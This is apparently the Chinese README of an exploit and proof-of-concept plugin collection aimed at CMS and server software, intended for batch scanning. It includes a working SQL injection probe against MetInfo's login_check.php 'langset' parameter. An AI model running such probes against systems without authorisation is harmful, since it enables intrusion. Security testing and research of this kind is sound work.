# cms_poc_exp
___

## 次项目的目的与意义
> 个人精力有限,故公开此项目让感兴趣的人一起搜集插件为自己/作者扫描器提供强力的驱动
> 如果感兴趣为本项目提供支持,可以联系本人QQ2563152103


+ 项目说明
  - 本项目插件现已支持Python3 不再兼容Python2,故若要使用 [ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)
  进行批量扫描,请自行修改插件支持Python2
  - [ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)批量扫描将会再之后修改为支持Python3

+ 现有的cms插件
  - [dedecms](https://github.com/1oid/cms_poc_exp/tree/master/dedecms)
  - [discuz](https://github.com/1oid/cms_poc_exp/tree/master/discuz)
  - [emobile](https://github.com/1oid/cms_poc_exp/tree/master/emobile)
  - [finecms](https://github.com/1oid/cms_poc_exp/tree/master/finecms)
  - [jcms](https://github.com/1oid/cms_poc_exp/tree/master/jcms)
  - [maccms](https://github.com/1oid/cms_poc_exp/tree/master/maccms)
  - [metinfo](https://github.com/1oid/cms_poc_exp/tree/master/metinfo)
  - [phpcms](https://github.com/1oid/cms_poc_exp/tree/master/phpcms)
  - [tomcat](https://github.com/1oid/cms_poc_exp/tree/master/tomcat)
  - [weblogic](https://github.com/1oid/cms_poc_exp/tree/master/weblogic)
  - [wordpress](https://github.com/1oid/cms_poc_exp/tree/master/wordpress)
  - [网站扫描插件_其他通用漏洞](https://github.com/1oid/cms_poc_exp/tree/master/www)
  - [yonyouoa](https://github.com/1oid/cms_poc_exp/tree/master/yongyouoa)
  - [zfsoft](https://github.com/1oid/cms_poc_exp/tree/master/zfsoft)

+ 插件编写格式,
```python
class Exploit:

  def attack(self, url):
    # 这里写验证漏洞的一些代码
    return "返回(提示)字符串"
```

以`metinfo_login_lang_sql`插件为例
```python
import requests
from urllib.parse import quote

class Exploit:

    def attack(self, url):
        true_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='1")
        false_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='2")

        response = requests.get(true_url)
        response2 = requests.get(false_url)

        if 'not have this language' in response2.text and 'not have this language' not in response.text:
            return "{} has SQL Injection!".format(true_url)
```


## 本项目目前支持/贡献的人
- [1oid(作者)](https://github.com/1oid)

